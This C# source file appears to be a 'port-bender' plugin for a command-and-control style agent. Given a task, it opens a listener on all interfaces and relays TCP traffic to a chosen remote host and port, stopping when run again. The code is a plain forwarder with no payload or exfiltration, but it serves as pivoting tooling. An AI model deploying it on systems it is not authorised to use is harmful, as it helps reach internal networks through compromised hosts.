using Workflow.Contracts;
using System.Text.Json;
using Workflow.Models;
using System.Net.Sockets;
using System.Net;
using Workflow.Utilities;
using port_bender;

namespace Workflow
{
    public class Plugin : IModule
    {
        public string Name => "port-bender";
        private IDataBroker messageManager { get; set; }
        private bool running = false;
        private string start_task = String.Empty;
        private TcpForwarderSlim? fwdr;
        public Plugin(PluginContext context)
        {
            this.messageManager = context.MessageManager;
        }

        public async Task Execute(ServerJob job)
        {
            DebugLog.Log($"Executing {Name} [{job.task.id}]");
            PortBenderArgs args = JsonSerializer.Deserialize<PortBenderArgs>(job.task.parameters);
            if(args is null){
                DebugLog.Log($"{Name} args null [{job.task.id}]");
                return;
            }

            if (running)
            {
                if(fwdr is null){
                    DebugLog.Log($"{Name} fwdr null, cannot stop [{job.task.id}]");
                    return;
                }

                DebugLog.Log($"{Name} stopping listener [{job.task.id}]");
                fwdr.Stop();
                running = false;
                messageManager.WriteLine($"Listener Stopped.", start_task, true);
                messageManager.WriteLine($"Listener Stopped.", job.task.id, true);
                return;
            }
            string host = args.destination.Split(':')[0];
            string sPort = args.destination.Split(':')[1];
            int port = 0;

            if (!int.TryParse(sPort, out port))
            {
                DebugLog.Log($"{Name} failed to parse port '{sPort}' [{job.task.id}]");
                messageManager.WriteLine($"Failed to get destination port.", job.task.id, true, "error");
                return;
            }

            IPAddress target = null;

            if (!IPAddress.TryParse(host, out target))
            {
                try
                {
                    target = Dns.GetHostAddresses(host)[0];
                }
                catch (Exception ex)
                {
                    DebugLog.Log($"{Name} failed to resolve host '{host}': {ex.Message} [{job.task.id}]");
                    messageManager.WriteLine($"Failed to resolve host: {ex.Message}", job.task.id, true, "error");
                    return;
                }
            }

            IPEndPoint local = new IPEndPoint(IPAddress.Any, args.port);

            IPEndPoint remote = new IPEndPoint(target, port);

            this.fwdr = new TcpForwarderSlim();

            DebugLog.Log($"{Name} starting listener {local} -> {remote} [{job.task.id}]");
            _ = Task.Run(() => fwdr.Start(local, remote));
            start_task = job.task.id;
            running = true;

            messageManager.WriteLine($"Started Listener.", job.task.id, true);
            DebugLog.Log($"{Name} completed [{job.task.id}]");
        }
    }
}
